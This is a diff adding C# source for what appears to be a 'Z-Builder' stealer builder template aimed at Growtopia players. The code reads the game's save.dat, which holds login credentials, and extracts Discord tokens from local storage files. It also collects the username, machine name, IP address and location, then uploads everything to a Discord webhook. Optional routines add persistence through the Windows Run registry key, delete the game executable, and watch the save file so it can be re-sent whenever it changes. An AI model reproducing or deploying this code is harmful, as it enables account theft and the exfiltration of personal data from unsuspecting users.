@@ -1,0 +1,399 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+namespace program
+{
+    static class Program
+    {
+        static void Main()
+        {
+            SendInfo();
+            //FakeErrorMessage
+            //AntiDelete
+            //HideStealer
+			//RunOnStartup
+			//DeleteGrowtopia
+            //Tracer
+        }
+        static void SendInfo()
+        {
+            string savedatpath = savedat();
+            string GrowID = GetGrowID(savedatpath);
+            string DToken = DiscordToken();
+            Webhook hook = new Webhook("webhook_url");
+            hook.Name = "Z";
+            hook.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
+            string details = "";
+            details += "```" + "Save.dat stolen by Z-Builder!" + Environment.NewLine + "GrowID: " + GrowID + Environment.NewLine;
+            details += "Discord Token: " + DToken + Environment.NewLine;
+            details += "Device Name: " + Environment.UserName + " / " + Environment.MachineName + Environment.NewLine;
+            details += "IP Address: " + GrabIP() + "City/Region/Country: " + GrabLocation() + Environment.NewLine;
+            details += "Time Zone: " + GrabTime()[1] + Environment.NewLine + "Time: " + GrabTime()[0];
+            details += "```";
+            hook.SendMessage(details, savedatpath, GrowID);
+        }
+        public static string GetGrowID(string savedatpath)
+        {
+            try
+            {
+                byte[] array = File.ReadAllBytes(savedatpath);
+                string @string = Encoding.ASCII.GetString(array);
+                string GrowID;
+                try
+                {
+                    string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
+                    GrowID = text;
+                }
+                catch
+                {
+                    GrowID = "N/A";
+                }
+                return GrowID;
+            }
+            catch
+            {
+                string GrowID = "N/A";
+                return GrowID;
+            }
+        }
+        public static string GrabIP()
+        {
+            string IPAddress = new WebClient() { Proxy = null }.DownloadString("http://icanhazip.com/");
+            return IPAddress;
+        }
+        public static string GrabLocation()
+        {
+            try
+            {
+                var info = new WebClient().DownloadString("https://www.geodatatool.com/");
+                string[] data = info.Split('\n');
+                string country = data[458].Trim();
+                string region = (((data[469]).Split('>'))[1]).Split('<')[0];
+                string city = (((data[474]).Split('>'))[1]).Split('<')[0];
+                string Location = city + "/" + region + "/" + country;
+                return Location;
+            }
+            catch
+            {
+                string Location = "N/A";
+                return Location;
+            }
+        }
+        public static List<string> GrabTime()
+        {
+            var zone = TimeZoneInfo.Local; 
+            List<string> TimeData = new List<string>();
+            TimeData.Add(DateTime.Now.ToString("h:mm:ss tt"));
+            TimeData.Add(zone.DisplayName);
+            return TimeData;
+        }
+        public static string savedat()
+        {
+            string text = "";
+            try
+            {
+                RegistryKey registryKey;
+                if (Environment.Is64BitOperatingSystem)
+                {
+                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
+                }
+                else
+                {
+                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
+                }
+                try
+                {
+                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
+                    string text2 = (string)registryKey.GetValue("path");
+                    if (Directory.Exists(text2))
+                    {
+                        string text3 = File.ReadAllText(text2 + "\\save.dat");
+                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
+                        {
+                            text = text2 + "\\save.dat";
+                            return text;
+                        }
+                        else
+                        {
+                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                            return text;
+                        }
+                    }
+                    else
+                    {
+                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                        return text;
+                    }
+                }
+                catch
+                {
+                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                    return text;
+                }
+            }
+            catch
+            {
+                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                return text;
+            }
+        }
+        public static string DiscordToken()
+        {
+            string result;
+            try
+            {
+                string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
+                if (!dotldb(ref text))
+                {
+                    dotlog(ref text);
+                }
+                Thread.Sleep(100);
+                string text2 = tokenx(text, text.EndsWith(".log"));
+                if (text2 == "")
+                {
+                    text2 = "N/A";
+                }
+                result = text2;
+            }
+            catch
+            {
+                result = "Not Found!";
+            }
+            return result;
+        }
+        private static bool dotldb(ref string stringx)
+        {
+            bool result;
+            try
+            {
+                if (Directory.Exists(stringx))
+                {
+                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
+                    {
+
+                        if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
+                        {
+                            stringx += fileInfo.Name;
+                            return stringx.EndsWith(".ldb");
+                        }
+                    }
+                    result = stringx.EndsWith(".ldb");
+                }
+                else
+                {
+                    result = false;
+                }
+            }
+            catch
+            {
+                result = false;
+            }
+            return result;
+        }
+        private static string tokenx(string stringx, bool boolx = false)
+        {
+            string result;
+            try
+            {
+                if (stringx.Contains(".log"))
+                    {
+                    stringx = Path.GetDirectoryName(stringx) + "\\LogCopy.txt";
+                }
+                byte[] bytes = File.ReadAllBytes(stringx);
+                string @string = Encoding.UTF8.GetString(bytes);
+                string text = "";
+                string text2 = @string;
+                while (text2.Contains("oken"))
+                {
+                    string[] array = IndexOf(text2).Split(new char[]
+                    {
+                        '"'
+                    });
+                    text = array[0];
+                    text2 = string.Join("\"", array);
+                    if (boolx && text.Length == 59)
+                    {
+                        break;
+                    }
+                }
+                result = text;
+                if (stringx.Contains("LogCopy.txt"))
+                {
+                    File.Delete(stringx);
+                }
+            }
+            catch
+            {
+                if (stringx.Contains("LogCopy.txt"))
+                {
+                    File.Delete(stringx);
+                }
+                result = "";
+            }
+            return result;
+        }
+        public static string dotlog(ref string stringx)
+        {
+            bool result;
+            try
+            {
+                if (Directory.Exists(stringx))
+                {
+                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
+                    {
+                        bool LogText = ReadLogFile(fileInfo.FullName);
+                        if (fileInfo.Name.EndsWith(".log") && LogText)
+                        {
+                            stringx += fileInfo.Name;
+                            return stringx.EndsWith(".log").ToString();
+                        }
+                    }
+                    result = stringx.EndsWith(".log");
+                }
+                else
+                {
+                    result = false;
+                }
+            }
+            catch
+            {
+                result = false;
+            }
+            return result.ToString();
+        }
+        static bool ReadLogFile(string path)
+        {
+            string newpath = Path.GetDirectoryName(path) + "\\LogCopy.txt";
+            File.Copy(path, newpath, true);
+            bool Result = File.ReadAllText(newpath).Contains("oken");
+            return Result;
+        }
+        private static string IndexOf(string stringx)
+        {
+            string result;
+            try
+            {
+                string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
+                {
+                    '"'
+                });
+                List<string> list = new List<string>();
+                list.AddRange(array);
+                list.RemoveAt(0);
+                array = list.ToArray();
+                result = string.Join("\"", array);
+            }
+            catch
+            {
+                result = null;
+            }
+            return result;
+        }
+		static void DeleteGrowtopia()
+        {
+            string growtopiafolder = "\\Growtopia\\Growtopia.exe";
+            string LOCALAPPDATA = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string fullPath = LOCALAPPDATA + growtopiafolder;
+            if (File.Exists(fullPath))
+            {
+                File.Delete(fullPath);
+            }
+        }
+		static void RunOnStartup()
+		{
+		    RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+			RK.SetValue(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, Application.ExecutablePath);
+		}	
+    }
+    class Webhook
+    {
+        private HttpClient Client;
+        private string Url;
+
+        public string Name { get; set; }
+        public string ProfilePictureUrl { get; set; }
+
+        public Webhook(string webhookUrl)
+        {
+            Client = new HttpClient();
+            Url = webhookUrl;
+        }
+
+        public bool SendMessage(string content, string file = null, string GrowID = null)
+        {
+            MultipartFormDataContent data = new MultipartFormDataContent();
+            data.Add(new StringContent(Name), "username");
+            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
+
+            if (file != null)
+            {
+                if (File.Exists(file))
+                {
+                    data.Add(new StringContent(content), "content");
+                    byte[] bytes = File.ReadAllBytes(file);
+                    data.Add(new ByteArrayContent(bytes), "save.dat", "save (" + GrowID + ") .dat");
+                    var resp = Client.PostAsync(Url, data).Result;
+                    return resp.StatusCode == HttpStatusCode.NoContent;
+                }
+                else
+                {
+                    content += "```No save.dat found in Growtopia folder```";
+                    data.Add(new StringContent(content), "content");
+                    var resp = Client.PostAsync(Url, data).Result;
+                    return resp.StatusCode == HttpStatusCode.NoContent;
+                }
+            }
+            return true;
+        }
+
+    }
+    class Tracer
+    {
+        public static string dirPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia";
+        public static string savePath = Program.savedat();
+        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
+        public static void TraceSave()
+        {
+            fileSystemWatcher.Path = dirPath;
+            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
+            fileSystemWatcher.Filter = "*.dat";
+            fileSystemWatcher.Changed += OnSaveChanged;
+            fileSystemWatcher.EnableRaisingEvents = true;
+            while (true)
+            {
+                Thread.Sleep(1000);
+            }
+        }
+        private static void OnSaveChanged(object source, FileSystemEventArgs e)
+        {
+            if (e.FullPath == savePath)
+            {
+                try
+                {
+                    fileSystemWatcher.EnableRaisingEvents = false;
+                    string GrowID = Program.GetGrowID(e.FullPath);
+                    string details = "";
+                    details += "```Save.dat traced by Z-Builder!" + Environment.NewLine + "Traced from " + Environment.UserName + " / " + Environment.MachineName + "!";
+                    details += Environment.NewLine + "GrowID: " + GrowID;
+                    details += "```";
+                    Webhook hook2 = new Webhook("webhook_url");
+                    hook2.Name = "Z";
+                    hook2.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
+                    hook2.SendMessage(details, e.FullPath, GrowID);
+                }
+                finally
+                {
+                    fileSystemWatcher.EnableRaisingEvents = true;
+                }
+            }
+        }
+    }
+}
